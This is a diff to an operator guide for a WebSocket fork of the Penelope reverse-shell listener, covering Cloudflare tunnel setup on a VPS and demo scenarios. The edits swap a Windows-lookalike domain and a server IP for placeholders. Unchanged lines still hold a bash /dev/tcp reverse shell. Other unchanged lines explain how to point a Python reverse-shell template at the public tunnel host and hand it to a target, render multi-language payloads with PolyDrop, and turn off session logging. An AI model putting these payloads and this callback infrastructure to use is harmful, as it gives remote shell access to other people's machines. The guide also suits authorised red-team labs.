@@ -12,7 +12,7 @@ cross-checked against the actual source.
 - **Fork additions live behind `--ws` and `--mcp`.** Plain TCP behavior is
   the upstream default.
 - **TLS via cloudflared.** Bind Penelope `--ws` on `127.0.0.1:PORT`; a
-  Cloudflare tunnel maps `pen*.windows-services.com` to it, terminates TLS,
+  Cloudflare tunnel maps `pen*.example.com` to it, terminates TLS,
   and the operator/target sees `wss://`. No cert to manage on the origin.
 - **Owner fixes present on `main`:** `tty.setraw` guard (`d9e08e9`) and
   `ssl.SSLWantReadError` retry (`a0b92d7`, `penelope.py:2152`). Both matter
@@ -27,9 +27,9 @@ cross-checked against the actual source.
 |---|---|---|
 | Python | 3.6+ | Kali/Ubuntu ship with 3.11+; `python3 --version` |
 | OS (operator) | Linux/macOS/FreeBSD | Full PTY, tab completion, F12 escape |
-| VPS | Ubuntu 24.04 (`root@38.60.250.105 -p 22`) | Already provisioned: base + `cloudflared` + `python3` |
+| VPS | Ubuntu 24.04 (`root@<SERVICE_VPS_IP> -p 22`) | Already provisioned: base + `cloudflared` + `python3` |
 | Cloudflared | v2025+ | Verified 2026.7.3 on the VPS |
-| DNS | `windows-services.com` in Cloudflare | Zone must be under the same Cloudflare account that runs `cloudflared tunnel login` |
+| DNS | `example.com` in Cloudflare | Zone must be under the same Cloudflare account that runs `cloudflared tunnel login` |
 | Pip installs | **none** | Zero third-party runtime deps by design |
 | Screen or tmux | either | For persistent listener sessions on the VPS |
 
@@ -58,6 +58,28 @@ In a second terminal on the same box:
 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
 ```
 
+### Native WebSocket and native WebSocket+TLS
+
+These two listeners prove Penelope's own transport modes independently of
+cloudflared. Keep both on loopback for the local demo.
+
+```bash
+# terminal 1: plaintext ws://127.0.0.1:8080/demo
+python3 penelope.py --ws --ws-path /demo -i 127.0.0.1 -p 8080 -a
+
+# one-time lab certificate
+openssl req -x509 -newkey rsa:3072 -nodes -days 7 \
+  -subj '/CN=localhost' -keyout /tmp/penelope.key -out /tmp/penelope.crt
+
+# terminal 2: native wss://127.0.0.1:8443/demo
+python3 penelope.py --ws --ws-path /demo -i 127.0.0.1 -p 8443 \
+  --tls-cert /tmp/penelope.crt --tls-key /tmp/penelope.key -a
+```
+
+The self-signed certificate is intentionally lab-only. A client must trust it
+explicitly for this native-WSS test. For the public show-off, use the
+plaintext loopback WS listener behind cloudflared instead.
+
 You should see:
 
 ```
@@ -82,10 +104,11 @@ Ctrl-C in the listener terminal to stop.
 ## Deploy to the VPS via cloudflared
 
 **Goal:** two Penelope WS listeners on the VPS, each behind its own
-Cloudflare subdomain, both giving `wss://` to the outside world.
+Cloudflare subdomain, both giving `wss://` to the outside world. The name
+`pen-plain` describes its plaintext **origin**, not a plaintext public URL.
 
-- `pen.windows-services.com`      → `http://127.0.0.1:8080` (primary)
-- `pen-plain.windows-services.com` → `http://127.0.0.1:8081` (secondary)
+- `pen.example.com`      → `http://127.0.0.1:8080` (primary)
+- `pen-alt.example.com` → `http://127.0.0.1:8081` (secondary)
 
 The Penelope listeners themselves are plain WS bound to loopback.
 Cloudflared terminates TLS at the edge, so nothing on the VPS needs a
@@ -94,7 +117,7 @@ certificate.
 ### 1. Push the script to the VPS
 
 ```bash
-scp -P 22 ~/dev/penelope/penelope.py root@38.60.250.105:/root/penelope.py
+scp -P 22 ~/dev/penelope/penelope.py root@<SERVICE_VPS_IP>:/root/penelope.py
 ```
 
 (Or `git clone` — `penelope.py` alone is enough; the tool is a single
@@ -103,12 +126,12 @@ file.)
 ### 2. Authenticate cloudflared (one-time)
 
 ```bash
-ssh -p 22 root@38.60.250.105
+ssh -p 22 root@<SERVICE_VPS_IP>
 cloudflared tunnel login
 ```
 
 Opens a browser URL — paste into the operator laptop, pick the
-`windows-services.com` zone, done. Certificate lands in
+`example.com` zone, done. Certificate lands in
 `/root/.cloudflared/cert.pem`.
 
 ### 3. Create the tunnel
@@ -122,8 +145,8 @@ cloudflared tunnel create penelope-demo
 ### 4. Route both subdomains at the tunnel
 
 ```bash
-cloudflared tunnel route dns penelope-demo pen.windows-services.com
-cloudflared tunnel route dns penelope-demo pen-plain.windows-services.com
+cloudflared tunnel route dns penelope-demo pen.example.com
+cloudflared tunnel route dns penelope-demo pen-alt.example.com
 ```
 
 Both are now CNAMEs to `<UUID>.cfargotunnel.com` in the Cloudflare zone.
@@ -137,9 +160,9 @@ tunnel: penelope-demo
 credentials-file: /root/.cloudflared/<UUID>.json
 
 ingress:
-  - hostname: pen.windows-services.com
+  - hostname: pen.example.com
     service: http://127.0.0.1:8080
-  - hostname: pen-plain.windows-services.com
+  - hostname: pen-alt.example.com
     service: http://127.0.0.1:8081
   - service: http_status:404
 EOF
@@ -162,10 +185,10 @@ systemd unit — fine for after the showoff, overkill for the demo.
 ### 7. Start both Penelope listeners
 
 ```bash
-# Primary: WS on :8080 → wss://pen.windows-services.com
+# Primary: WS on :8080 → wss://pen.example.com
 screen -dmS pen8080 python3 /root/penelope.py --ws -i 127.0.0.1 -p 8080 -a
 
-# Secondary: WS on :8081 → wss://pen-plain.windows-services.com
+# Secondary: WS on :8081 → wss://pen-alt.example.com
 screen -dmS pen8081 python3 /root/penelope.py --ws -i 127.0.0.1 -p 8081 -a
 ```
 
@@ -174,7 +197,7 @@ Attach to either with `screen -r pen8080`; detach with `Ctrl-A d`.
 ### 8. Reachability check from the operator box
 
 ```bash
-curl -I https://pen.windows-services.com/
+curl -I https://pen.example.com/
 # Expected: HTTP/2 400 or 426  (no --ws-backend set → non-WS request rejected)
 ```
 
@@ -185,23 +208,25 @@ listening on that local port.
 
 ## Demo scenarios
 
-### Scenario 1 — Two listeners live at once
+### Scenario 1 — Two cloudflared WS origins live at once
 
-**Show:** the fork exposes plain and TLS-terminated WS endpoints
-simultaneously.
+**Show:** two plaintext loopback WS listeners can be routed independently;
+both public endpoints are WSS because Cloudflare terminates TLS. Use the
+native WS/WSS smoke test above to demonstrate Penelope's own TLS termination.
 
 ```bash
 # On the VPS, in a fresh SSH shell:
-screen -r pen8080   # WS listener on :8080  (behind pen.windows-services.com)
+screen -r pen8080   # WS listener on :8080  (behind pen.example.com)
 # Ctrl-A d, then:
-screen -r pen8081   # WS listener on :8081  (behind pen-plain.windows-services.com)
+screen -r pen8081   # WS listener on :8081  (behind pen-alt.example.com)
 ```
 
 Both should print their `➤ ... → wss://<host>:<port>/` banner and a
 `python3 -c "..."` payload from `-a`.
 
-Talking point: same code path, same session semantics — TLS is a
-tunnel-layer detail, not a Penelope concern.
+Talking point: the public demo places TLS at the tunnel edge, while Penelope
+can also terminate TLS itself with `--tls-cert` and `--tls-key` when the
+deployment requires end-to-end origin encryption.
 
 ### Scenario 2 — Python payload flow (agent generation and reception)
 
@@ -212,7 +237,7 @@ tunnel-layer detail, not a Penelope concern.
    by `-a`. **Important:** the payload embeds the *bind IP* as its
    `Host:` header — the listener bound to `127.0.0.1`, so the payload
    points at `127.0.0.1`. For a target that isn't on the VPS, rewrite
-   `HOST` and `HOSTHDR` to `pen.windows-services.com` and `PORT` to `443`
+   `HOST` and `HOSTHDR` to `pen.example.com` and `PORT` to `443`
    (cloudflared TLS), and set `USE_TLS = True`. Simplest one-liner to hand
    to a target:
 
@@ -226,8 +251,8 @@ tunnel-layer detail, not a Penelope concern.
 
    where `payload.py` is the raw template
    (`penelope.py` → `WS_PYTHON_REVSHELL_TEMPLATE`, defined at line 3007)
-   filled with `HOST="pen.windows-services.com"`, `PORT=443`, `PATH="/"`,
-   `HOSTHDR="pen.windows-services.com"`, `USE_TLS=True`.
+   filled with `HOST="pen.example.com"`, `PORT=443`, `PATH="/"`,
+   `HOSTHDR="pen.example.com"`, `USE_TLS=True`.
 
 2. Paste on the target (a Linux VM, Kali, or macOS with `python3`).
 
@@ -253,7 +278,7 @@ PolyDrop already ships WebSocket templates at
 Crystal, Dart, Tcl, D, V, Bun, F#. Each connects to a Penelope `--ws`
 listener with identical RFC 6455 framing.
 
-Render three of them against `wss://pen.windows-services.com/` (adapt to
+Render three of them against `wss://pen.example.com/` (adapt to
 PolyDrop's own CLI — the templating substitutes `{{LHOST}}`, `{{LPORT}}`,
 `{{WS_PATH}}`, `{{WS_HOST}}`, `{{USE_TLS}}`):
 
@@ -361,7 +386,7 @@ Disable session logging entirely with `-L`; keep target shell history with
      cloudflared endpoint.
    - **Diagnose:** on the VPS `curl -v -H 'Upgrade: websocket'
      -H 'Connection: Upgrade' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZQ=='
-     -H 'Sec-WebSocket-Version: 13' https://pen.windows-services.com/` —
+     -H 'Sec-WebSocket-Version: 13' https://pen.example.com/` —
      look for `HTTP/1.1 101` in the response.
 
 4. **`curl -I` returns `502 Bad Gateway` from cloudflared.**
@@ -395,7 +420,7 @@ Disable session logging entirely with `-L`; keep target shell history with
    - **Cause:** the listener was bound to `127.0.0.1`, so `-a` fills the
      payload with the bind IP — correct for local smoke tests, useless
      for a target that isn't on the VPS.
-   - **Fix:** hand-edit the payload to point at `pen.windows-services.com`
+   - **Fix:** hand-edit the payload to point at `pen.example.com`
      port `443` with `USE_TLS=True` before delivery. See Scenario 2.
 
 9. **Session dies silently after `download <large-file>`.**
